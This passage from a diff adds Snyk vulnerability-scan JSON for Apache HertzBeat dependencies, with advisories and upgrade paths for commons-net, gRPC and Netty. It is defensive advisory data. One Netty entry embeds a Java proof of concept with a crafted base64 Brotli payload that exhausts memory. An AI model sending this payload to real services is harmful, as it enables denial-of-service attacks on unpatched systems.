+          "org.apache.hertzbeat:hertzbeat-collector-nebulagraph@2.0-SNAPSHOT",
+          "com.vesoft:client@3.6.0",
+          "commons-lang:commons-lang@2.6"
+        ],
+        "upgradePath": [],
+        "isUpgradable": false,
+        "isPatchable": false,
+        "name": "commons-lang:commons-lang",
+        "version": "2.6"
+      },
+      {
+        "id": "SNYK-JAVA-COMMONSNET-3153503",
+        "title": "Information Exposure",
+        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
+        "credit": [
+          "ZeddYu Lu"
+        ],
+        "semver": {
+          "vulnerable": [
+            "[,3.9.0)"
+          ]
+        },
+        "exploit": "Not Defined",
+        "fixedIn": [
+          "3.9.0"
+        ],
+        "patches": [],
+        "insights": {
+          "triageAdvice": null
+        },
+        "language": "java",
+        "severity": "low",
+        "cvssScore": 3.7,
+        "functions": [],
+        "malicious": false,
+        "isDisputed": false,
+        "moduleName": "commons-net:commons-net",
+        "references": [
+          {
+            "url": "https://issues.apache.org/jira/browse/NET-711",
+            "title": "Apache Jira Issues"
+          },
+          {
+            "url": "https://lists.apache.org/thread/o6yn9r9x6s94v97264hmgol1sf48mvx7",
+            "title": "Apache Thread"
+          },
+          {
+            "url": "https://github.com/apache/commons-net/commit/b0bff89f70cfea70009e22f87639816cc3993974",
+            "title": "GitHub Commit"
+          }
+        ],
+        "cvssDetails": [
+          {
+            "assigner": "NVD",
+            "severity": "medium",
+            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
+            "cvssV3BaseScore": 6.5,
+            "modificationTime": "2024-03-11T09:52:50.049118Z"
+          },
+          {
+            "assigner": "Red Hat",
+            "severity": "medium",
+            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
+            "cvssV3BaseScore": 6.5,
+            "modificationTime": "2024-03-11T09:53:54.413988Z"
+          }
+        ],
+        "cvssSources": [
+          {
+            "type": "primary",
+            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
+            "assigner": "Snyk",
+            "severity": "low",
+            "baseScore": 3.7,
+            "cvssVersion": "3.1",
+            "modificationTime": "2024-03-06T14:06:59.949459Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
+            "assigner": "NVD",
+            "severity": "medium",
+            "baseScore": 6.5,
+            "cvssVersion": "3.1",
+            "modificationTime": "2024-03-11T09:52:50.049118Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
+            "assigner": "Red Hat",
+            "severity": "medium",
+            "baseScore": 6.5,
+            "cvssVersion": "3.1",
+            "modificationTime": "2024-03-11T09:53:54.413988Z"
+          }
+        ],
+        "description": "## Overview\n\nAffected versions of this package are vulnerable to Information Exposure as the FTP client trusts the host from PASV responses by default. A malicious server can redirect the Commons Net code to use a different host, but the user has to connect to the malicious server in the first place. This may lead to leakage of information about services running on the private network of the client.\n## Remediation\nUpgrade `commons-net:commons-net` to version 3.9.0 or higher.\n## References\n- [Apache Jira Issues](https://issues.apache.org/jira/browse/NET-711)\n- [Apache Thread](https://lists.apache.org/thread/o6yn9r9x6s94v97264hmgol1sf48mvx7)\n- [GitHub Commit](https://github.com/apache/commons-net/commit/b0bff89f70cfea70009e22f87639816cc3993974)\n",
+        "epssDetails": {
+          "percentile": "0.43879",
+          "probability": "0.00214",
+          "modelVersion": "v2025.03.14"
+        },
+        "identifiers": {
+          "CVE": [
+            "CVE-2021-37533"
+          ],
+          "CWE": [
+            "CWE-200"
+          ]
+        },
+        "packageName": "commons-net:commons-net",
+        "proprietary": false,
+        "creationTime": "2022-12-04T12:37:37.734943Z",
+        "functions_new": [],
+        "alternativeIds": [],
+        "disclosureTime": "2022-12-04T12:30:17Z",
+        "exploitDetails": {
+          "sources": [],
+          "maturityLevels": [
+            {
+              "type": "secondary",
+              "level": "Not Defined",
+              "format": "CVSSv3"
+            },
+            {
+              "type": "primary",
+              "level": "Not Defined",
+              "format": "CVSSv4"
+            }
+          ]
+        },
+        "packageManager": "maven",
+        "mavenModuleName": {
+          "groupId": "commons-net",
+          "artifactId": "commons-net"
+        },
+        "publicationTime": "2022-12-04T14:15:13.060876Z",
+        "severityBasedOn": "CVSS",
+        "modificationTime": "2024-03-11T09:53:54.413988Z",
+        "socialTrendAlert": false,
+        "severityWithCritical": "low",
+        "from": [
+          "org.apache.hertzbeat:hertzbeat-ai@2.0-SNAPSHOT",
+          "org.apache.hertzbeat:hertzbeat-alerter@2.0-SNAPSHOT",
+          "org.apache.hertzbeat:hertzbeat-warehouse@2.0-SNAPSHOT",
+          "commons-net:commons-net@3.8.0"
+        ],
+        "upgradePath": [],
+        "isUpgradable": false,
+        "isPatchable": false,
+        "name": "commons-net:commons-net",
+        "version": "3.8.0"
+      },
+      {
+        "id": "SNYK-JAVA-IOGRPC-13786834",
+        "title": "Allocation of Resources Without Limits or Throttling",
+        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+        "credit": [
+          "Gal Bar Nahum",
+          "Anat Bremler-Barr",
+          "Yaniv Harel"
+        ],
+        "semver": {
+          "vulnerable": [
+            "[,1.75.0)"
+          ]
+        },
+        "exploit": "Not Defined",
+        "fixedIn": [
+          "1.75.0"
+        ],
+        "patches": [],
+        "insights": {
+          "triageAdvice": null
+        },
+        "language": "java",
+        "severity": "high",
+        "cvssScore": 8.7,
+        "functions": [],
+        "malicious": false,
+        "isDisputed": false,
+        "moduleName": "io.grpc:grpc-netty-shaded",
+        "references": [
+          {
+            "url": "https://github.com/grpc/grpc-java/commit/6462ef9a11980e168c21d90bbc7245c728fd1a7a",
+            "title": "GitHub Commit"
+          },
+          {
+            "url": "https://github.com/netty/netty/commit/009bd17b38a39fb1eecf9d22ea8ae8108afaac59",
+            "title": "GitHub Commit"
+          },
+          {
+            "url": "https://github.com/netty/netty/commit/350da8750a44e7d31bc1bb9957dc006055cdfe35",
+            "title": "GitHub Commit"
+          }
+        ],
+        "cvssDetails": [
+          {
+            "assigner": "NVD",
+            "severity": "high",
+            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+            "cvssV3BaseScore": 7.5,
+            "modificationTime": "2025-09-11T01:13:24.093098Z"
+          },
+          {
+            "assigner": "Red Hat",
+            "severity": "high",
+            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+            "cvssV3BaseScore": 7.5,
+            "modificationTime": "2025-08-16T13:34:41.193101Z"
+          },
+          {
+            "assigner": "SUSE",
+            "severity": "high",
+            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+            "cvssV3BaseScore": 7.5,
+            "modificationTime": "2025-09-10T16:08:53.515119Z"
+          }
+        ],
+        "cvssSources": [
+          {
+            "type": "primary",
+            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+            "assigner": "Snyk",
+            "severity": "high",
+            "baseScore": 8.7,
+            "cvssVersion": "4.0",
+            "modificationTime": "2025-10-31T10:55:57.641610Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+            "assigner": "Snyk",
+            "severity": "high",
+            "baseScore": 7.5,
+            "cvssVersion": "3.1",
+            "modificationTime": "2025-10-31T10:55:57.641610Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+            "assigner": "NVD",
+            "severity": "high",
+            "baseScore": 7.5,
+            "cvssVersion": "3.1",
+            "modificationTime": "2025-09-11T01:13:24.093098Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+            "assigner": "Red Hat",
+            "severity": "high",
+            "baseScore": 7.5,
+            "cvssVersion": "3.1",
+            "modificationTime": "2025-08-16T13:34:41.193101Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+            "assigner": "SUSE",
+            "severity": "high",
+            "baseScore": 7.5,
+            "cvssVersion": "3.1",
+            "modificationTime": "2025-09-10T16:08:53.515119Z"
+          }
+        ],
+        "description": "## Overview\n\nAffected versions of this package are vulnerable to Allocation of Resources Without Limits or Throttling through the improper handling of concurrently active streams per connection. An attacker can cause resource exhaustion and disrupt service availability by rapidly sending crafted frames, such as `WINDOW_UPDATE`, `HEADERS`, or `PRIORITY`, that manipulate the server's stream reset logic, leading to unbounded concurrent stream processing.\n## Remediation\nUpgrade `io.grpc:grpc-netty-shaded` to version 1.75.0 or higher.\n## References\n- [GitHub Commit](https://github.com/grpc/grpc-java/commit/6462ef9a11980e168c21d90bbc7245c728fd1a7a)\n- [GitHub Commit](https://github.com/netty/netty/commit/009bd17b38a39fb1eecf9d22ea8ae8108afaac59)\n- [GitHub Commit](https://github.com/netty/netty/commit/350da8750a44e7d31bc1bb9957dc006055cdfe35)\n",
+        "epssDetails": {
+          "percentile": "0.31552",
+          "probability": "0.00121",
+          "modelVersion": "v2025.03.14"
+        },
+        "identifiers": {
+          "CVE": [
+            "CVE-2025-55163"
+          ],
+          "CWE": [
+            "CWE-770"
+          ],
+          "GHSA": [
+            "GHSA-prj3-ccx8-p6x4"
+          ]
+        },
+        "packageName": "io.grpc:grpc-netty-shaded",
+        "proprietary": false,
+        "creationTime": "2025-10-31T10:55:33.703004Z",
+        "functions_new": [],
+        "alternativeIds": [],
+        "disclosureTime": "2025-08-13T19:06:56Z",
+        "exploitDetails": {
+          "sources": [],
+          "maturityLevels": [
+            {
+              "type": "secondary",
+              "level": "Not Defined",
+              "format": "CVSSv3"
+            },
+            {
+              "type": "primary",
+              "level": "Not Defined",
+              "format": "CVSSv4"
+            }
+          ]
+        },
+        "packageManager": "maven",
+        "mavenModuleName": {
+          "groupId": "io.grpc",
+          "artifactId": "grpc-netty-shaded"
+        },
+        "publicationTime": "2025-10-31T10:55:33.909141Z",
+        "severityBasedOn": "CVSS",
+        "modificationTime": "2025-10-31T10:55:57.641610Z",
+        "socialTrendAlert": false,
+        "severityWithCritical": "high",
+        "from": [
+          "org.apache.hertzbeat:hertzbeat-ai@2.0-SNAPSHOT",
+          "org.apache.hertzbeat:hertzbeat-alerter@2.0-SNAPSHOT",
+          "org.apache.hertzbeat:hertzbeat-warehouse@2.0-SNAPSHOT",
+          "io.greptime:ingester-all@0.11.0",
+          "io.greptime:ingester-grpc@0.11.0",
+          "io.grpc:grpc-netty-shaded@1.56.1"
+        ],
+        "upgradePath": [],
+        "isUpgradable": false,
+        "isPatchable": false,
+        "name": "io.grpc:grpc-netty-shaded",
+        "version": "1.56.1"
+      },
+      {
+        "id": "SNYK-JAVA-IONETTY-11799531",
+        "title": "Allocation of Resources Without Limits or Throttling",
+        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+        "credit": [
+          "Gal Bar Nahum",
+          "Anat Bremler-Barr",
+          "Yaniv Harel"
+        ],
+        "semver": {
+          "vulnerable": [
+            "[,4.1.124.Final)",
+            "[4.2.0.Alpha1,4.2.4.Final)"
+          ]
+        },
+        "exploit": "Not Defined",
+        "fixedIn": [
+          "4.1.124.Final",
+          "4.2.4.Final"
+        ],
+        "patches": [],
+        "insights": {
+          "triageAdvice": null
+        },
+        "language": "java",
+        "severity": "high",
+        "cvssScore": 8.7,
+        "functions": [],
+        "malicious": false,
+        "isDisputed": false,
+        "moduleName": "io.netty:netty-codec-http2",
+        "references": [
+          {
+            "url": "https://github.com/grpc/grpc-java/commit/6462ef9a11980e168c21d90bbc7245c728fd1a7a",
+            "title": "GitHub Commit"
+          },
+          {
+            "url": "https://github.com/netty/netty/commit/009bd17b38a39fb1eecf9d22ea8ae8108afaac59",
+            "title": "GitHub Commit"
+          },
+          {
+            "url": "https://github.com/netty/netty/commit/350da8750a44e7d31bc1bb9957dc006055cdfe35",
+            "title": "GitHub Commit"
+          }
+        ],
+        "cvssDetails": [
+          {
+            "assigner": "Red Hat",
+            "severity": "high",
+            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+            "cvssV3BaseScore": 7.5,
+            "modificationTime": "2025-08-16T13:34:41.193101Z"
+          },
+          {
+            "assigner": "SUSE",
+            "severity": "high",
+            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+            "cvssV3BaseScore": 7.5,
+            "modificationTime": "2025-09-10T16:08:53.515119Z"
+          },
+          {
+            "assigner": "NVD",
+            "severity": "high",
+            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+            "cvssV3BaseScore": 7.5,
+            "modificationTime": "2025-09-11T01:13:24.093098Z"
+          }
+        ],
+        "cvssSources": [
+          {
+            "type": "primary",
+            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+            "assigner": "Snyk",
+            "severity": "high",
+            "baseScore": 8.7,
+            "cvssVersion": "4.0",
+            "modificationTime": "2025-10-31T10:55:57.581163Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+            "assigner": "Snyk",
+            "severity": "high",
+            "baseScore": 7.5,
+            "cvssVersion": "3.1",
+            "modificationTime": "2025-10-31T10:55:57.581163Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+            "assigner": "Red Hat",
+            "severity": "high",
+            "baseScore": 7.5,
+            "cvssVersion": "3.1",
+            "modificationTime": "2025-08-16T13:34:41.193101Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+            "assigner": "SUSE",
+            "severity": "high",
+            "baseScore": 7.5,
+            "cvssVersion": "3.1",
+            "modificationTime": "2025-09-10T16:08:53.515119Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+            "assigner": "NVD",
+            "severity": "high",
+            "baseScore": 7.5,
+            "cvssVersion": "3.1",
+            "modificationTime": "2025-09-11T01:13:24.093098Z"
+          }
+        ],
+        "description": "## Overview\n[io.netty:netty-codec-http2](http://netty.io/) is a HTTP2 sub package for the netty library, an event-driven asynchronous network application framework.\n\nAffected versions of this package are vulnerable to Allocation of Resources Without Limits or Throttling through the improper handling of concurrently active streams per connection. An attacker can cause resource exhaustion and disrupt service availability by rapidly sending crafted frames, such as `WINDOW_UPDATE`, `HEADERS`, or `PRIORITY`, that manipulate the server's stream reset logic, leading to unbounded concurrent stream processing.\n## Remediation\nUpgrade `io.netty:netty-codec-http2` to version 4.1.124.Final, 4.2.4.Final or higher.\n## References\n- [GitHub Commit](https://github.com/grpc/grpc-java/commit/6462ef9a11980e168c21d90bbc7245c728fd1a7a)\n- [GitHub Commit](https://github.com/netty/netty/commit/009bd17b38a39fb1eecf9d22ea8ae8108afaac59)\n- [GitHub Commit](https://github.com/netty/netty/commit/350da8750a44e7d31bc1bb9957dc006055cdfe35)\n",
+        "epssDetails": {
+          "percentile": "0.31552",
+          "probability": "0.00121",
+          "modelVersion": "v2025.03.14"
+        },
+        "identifiers": {
+          "CVE": [
+            "CVE-2025-55163"
+          ],
+          "CWE": [
+            "CWE-770"
+          ],
+          "GHSA": [
+            "GHSA-prj3-ccx8-p6x4"
+          ]
+        },
+        "packageName": "io.netty:netty-codec-http2",
+        "proprietary": false,
+        "creationTime": "2025-08-14T08:28:21.563240Z",
+        "functions_new": [],
+        "alternativeIds": [],
+        "disclosureTime": "2025-08-13T19:06:56Z",
+        "exploitDetails": {
+          "sources": [],
+          "maturityLevels": [
+            {
+              "type": "secondary",
+              "level": "Not Defined",
+              "format": "CVSSv3"
+            },
+            {
+              "type": "primary",
+              "level": "Not Defined",
+              "format": "CVSSv4"
+            }
+          ]
+        },
+        "packageManager": "maven",
+        "mavenModuleName": {
+          "groupId": "io.netty",
+          "artifactId": "netty-codec-http2"
+        },
+        "publicationTime": "2025-08-14T11:17:03.856407Z",
+        "severityBasedOn": "CVSS",
+        "modificationTime": "2025-10-31T10:55:57.581163Z",
+        "socialTrendAlert": false,
+        "severityWithCritical": "high",
+        "from": [
+          "org.apache.hertzbeat:hertzbeat-ai@2.0-SNAPSHOT",
+          "org.springframework.boot:spring-boot-starter-webflux@3.4.2",
+          "org.springframework.boot:spring-boot-starter-reactor-netty@3.4.2",
+          "io.projectreactor.netty:reactor-netty-http@1.2.2",
+          "io.netty:netty-codec-http2@4.1.117.Final"
+        ],
+        "upgradePath": [
+          false,
+          "org.springframework.boot:spring-boot-starter-webflux@3.4.10",
+          "org.springframework.boot:spring-boot-starter-reactor-netty@3.4.10",
+          "io.projectreactor.netty:reactor-netty-http@1.2.10",
+          "io.netty:netty-codec-http2@4.1.127.Final"
+        ],
+        "isUpgradable": true,
+        "isPatchable": false,
+        "name": "io.netty:netty-codec-http2",
+        "version": "4.1.117.Final"
+      },
+      {
+        "id": "SNYK-JAVA-IONETTY-12485151",
+        "title": "Improper Handling of Highly Compressed Data (Data Amplification)",
+        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
+        "credit": [
+          "Jonas Konrad"
+        ],
+        "semver": {
+          "vulnerable": [
+            "[,4.1.125.Final)"
+          ]
+        },
+        "exploit": "Proof of Concept",
+        "fixedIn": [
+          "4.1.125.Final"
+        ],
+        "patches": [],
+        "insights": {
+          "triageAdvice": null
+        },
+        "language": "java",
+        "severity": "high",
+        "cvssScore": 8.7,
+        "functions": [],
+        "malicious": false,
+        "isDisputed": false,
+        "moduleName": "io.netty:netty-codec-http2",
+        "references": [
+          {
+            "url": "https://github.com/netty/netty/commit/34894ac73b02efefeacd9c0972780b32dc3de04f",
+            "title": "GitHub Commit"
+          },
+          {
+            "url": "https://github.com/netty/netty/commit/9d804c54ce962408ae6418255a83a13924f7145d",
+            "title": "GitHub Commit"
+          }
+        ],
+        "cvssDetails": [
+          {
+            "assigner": "Red Hat",
+            "severity": "high",
+            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+            "cvssV3BaseScore": 7.5,
+            "modificationTime": "2026-01-20T05:27:34.175701Z"
+          },
+          {
+            "assigner": "NVD",
+            "severity": "high",
+            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+            "cvssV3BaseScore": 7.5,
+            "modificationTime": "2025-09-09T01:13:28.751869Z"
+          },
+          {
+            "assigner": "SUSE",
+            "severity": "medium",
+            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+            "cvssV3BaseScore": 5.3,
+            "modificationTime": "2025-09-10T16:11:00.518112Z"
+          }
+        ],
+        "cvssSources": [
+          {
+            "type": "primary",
+            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
+            "assigner": "Snyk",
+            "severity": "high",
+            "baseScore": 8.7,
+            "cvssVersion": "4.0",
+            "modificationTime": "2025-09-09T08:57:08.130428Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
+            "assigner": "Snyk",
+            "severity": "high",
+            "baseScore": 7.5,
+            "cvssVersion": "3.1",
+            "modificationTime": "2025-09-09T08:57:08.130428Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+            "assigner": "Red Hat",
+            "severity": "high",
+            "baseScore": 7.5,
+            "cvssVersion": "3.1",
+            "modificationTime": "2026-01-20T05:27:34.175701Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+            "assigner": "NVD",
+            "severity": "high",
+            "baseScore": 7.5,
+            "cvssVersion": "3.1",
+            "modificationTime": "2025-09-09T01:13:28.751869Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+            "assigner": "SUSE",
+            "severity": "medium",
+            "baseScore": 5.3,
+            "cvssVersion": "3.1",
+            "modificationTime": "2025-09-10T16:11:00.518112Z"
+          }
+        ],
+        "description": "## Overview\n[io.netty:netty-codec-http2](http://netty.io/) is a HTTP2 sub package for the netty library, an event-driven asynchronous network application framework.\n\nAffected versions of this package are vulnerable to Improper Handling of Highly Compressed Data (Data Amplification) via the `BrotliDecoder.decompress` function, which has no limit on how often it calls `pull`, decompressing data 64K bytes at a time. An attacker can exhaust system memory and cause application downtime by submitting specially crafted compressed input that triggers excessive buffer allocations.\n## PoC\n``` java\r\nimport io.netty.buffer.Unpooled;\r\nimport io.netty.channel.embedded.EmbeddedChannel;\r\n\r\nimport java.util.Base64;\r\n\r\npublic class T {\r\n    public static void main(String[] args) {\r\n        EmbeddedChannel channel = new EmbeddedChannel(new BrotliDecoder());\r\n        channel.writeInbound(Unpooled.wrappedBuffer(Base64.getDecoder().decode(\"aPpxD1tETigSAGj6cQ8vRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROMBIAEgIaHwBETlQQVFcXlgA=\")));\r\n    }\r\n}\r\n```\n## Remediation\nUpgrade `io.netty:netty-codec-http2` to version 4.1.125.Final or higher.\n## References\n- [GitHub Commit](https://github.com/netty/netty/commit/34894ac73b02efefeacd9c0972780b32dc3de04f)\n- [GitHub Commit](https://github.com/netty/netty/commit/9d804c54ce962408ae6418255a83a13924f7145d)\n",
+        "epssDetails": {
+          "percentile": "0.16013",
+          "probability": "0.00051",
+          "modelVersion": "v2025.03.14"
+        },
+        "identifiers": {
+          "CVE": [
+            "CVE-2025-58057"
+          ],
+          "CWE": [
+            "CWE-409"
+          ],
+          "GHSA": [
+            "GHSA-3p8m-j85q-pgmj"
+          ]
+        },
+        "packageName": "io.netty:netty-codec-http2",
+        "proprietary": false,
+        "creationTime": "2025-09-04T06:43:11.522577Z",
+        "functions_new": [],
+        "alternativeIds": [],
+        "disclosureTime": "2025-09-03T22:42:02Z",
+        "exploitDetails": {
+          "sources": [
+            "Snyk"
+          ],
+          "maturityLevels": [
+            {
+              "type": "secondary",
+              "level": "Proof of Concept",
+              "format": "CVSSv3"
+            },
+            {
+              "type": "primary",
+              "level": "Proof of Concept",
+              "format": "CVSSv4"
+            }
+          ]
+        },
+        "packageManager": "maven",
+        "mavenModuleName": {
+          "groupId": "io.netty",
+          "artifactId": "netty-codec-http2"
+        },
+        "publicationTime": "2025-09-04T10:21:08.446405Z",
+        "severityBasedOn": "CVSS",
+        "modificationTime": "2026-01-20T05:27:34.175701Z",
+        "socialTrendAlert": false,
+        "severityWithCritical": "high",
+        "from": [
+          "org.apache.hertzbeat:hertzbeat-ai@2.0-SNAPSHOT",
+          "org.springframework.boot:spring-boot-starter-webflux@3.4.2",
+          "org.springframework.boot:spring-boot-starter-reactor-netty@3.4.2",
+          "io.projectreactor.netty:reactor-netty-http@1.2.2",
+          "io.netty:netty-codec-http2@4.1.117.Final"
+        ],
+        "upgradePath": [
+          false,
+          "org.springframework.boot:spring-boot-starter-webflux@3.4.10",
+          "org.springframework.boot:spring-boot-starter-reactor-netty@3.4.10",
+          "io.projectreactor.netty:reactor-netty-http@1.2.10",
+          "io.netty:netty-codec-http2@4.1.127.Final"
+        ],
+        "isUpgradable": true,
+        "isPatchable": false,
+        "name": "io.netty:netty-codec-http2",
+        "version": "4.1.117.Final"
+      },
+      {
+        "id": "SNYK-JAVA-IONETTY-12485149",
+        "title": "HTTP Request Smuggling",
+        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N/E:P",
+        "credit": [
+          "Jeppe Bonde Weikop",
+          "Jonathan Leitschuh"
+        ],
+        "semver": {
+          "vulnerable": [
+            "[,4.1.125.Final)",
+            "[4.2.0.Alpha1,4.2.5.Final)"
+          ]
+        },
+        "exploit": "Proof of Concept",
+        "fixedIn": [
+          "4.1.125.Final",
+          "4.2.5.Final"
+        ],
+        "patches": [],
+        "insights": {
+          "triageAdvice": null
+        },
+        "language": "java",
+        "severity": "high",
+        "cvssScore": 8.7,
+        "functions": [],
+        "malicious": false,
+        "isDisputed": false,
+        "moduleName": "io.netty:netty-codec-http",
+        "references": [
+          {
+            "url": "https://github.com/netty/netty/commit/39d3ecf8f0c57a7469ba927b2163d4cb4314b138",
+            "title": "GitHub Commit"
+          },
+          {
+            "url": "https://github.com/netty/netty/commit/edb55fd8e0a3bcbd85881e423464f585183d1284",
+            "title": "GitHub Commit"
+          },
+          {
+            "url": "https://github.com/JLLeitschuh/unCVEed/issues/1",
+            "title": "GitHub Issue"
+          },
+          {
+            "url": "https://github.com/netty/netty/issues/15522",
+            "title": "GitHub Issue"
+          },
+          {
+            "url": "https://github.com/netty/netty/pull/15611",
+            "title": "GitHub PR"
+          }
+        ],
+        "cvssDetails": [
+          {
